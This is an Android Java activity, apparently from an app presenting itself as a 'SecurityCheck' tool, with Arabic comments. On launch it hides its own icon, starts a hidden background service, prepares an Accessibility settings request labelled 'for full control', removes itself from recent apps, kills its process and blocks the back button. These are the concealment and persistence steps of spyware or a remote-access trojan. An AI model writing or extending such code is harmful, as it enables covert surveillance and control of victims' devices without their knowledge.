package com.sec.check;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;

public class MainActivity extends Activity {
    private static final String TAG = "SecurityCheck";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "App started - hiding...");

        // 1) اخفِ الأيقونة فوراً
        hideAppIcon();

        // 2) شغّل الخدمة في الخلفية
        startBackgroundService();

        // 3) اطلب صلاحيات إضافية
        requestSpecialPermissions();

        // 4) اخفِ التطبيق من Recent Apps
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            finishAndRemoveTask();
        } else {
            finish();
        }

        // 5) اقتل الـ Activity
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            android.os.Process.killProcess(android.os.Process.myPid());
        }, 500);
    }

    /**
     * إخفاء أيقونة التطبيق
     */
    private void hideAppIcon() {
        try {
            PackageManager pm = getPackageManager();
            ComponentName componentName = new ComponentName(this, MainActivity.class);
            pm.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
            Log.d(TAG, "App icon hidden");
        } catch (Exception e) {
            Log.e(TAG, "hideAppIcon error: " + e.getMessage());
        }
    }

    /**
     * تشغيل خدمة الخلفية
     */
    private void startBackgroundService() {
        try {
            Intent serviceIntent = new Intent(this, ServiceRunner.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            Log.d(TAG, "Background service started");
        } catch (Exception e) {
            Log.e(TAG, "startBackgroundService error: " + e.getMessage());
        }
    }

    /**
     * طلب صلاحيات خاصة
     */
    private void requestSpecialPermissions() {
        // صلاحية Accessibility (للتحكم الكامل)
        try {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            // لا نفتحها فوراً — ننتظر
        } catch (Exception e) {}
    }

    @Override
    public void onBackPressed() {
        // لا تفعل شيء
    }
                            }
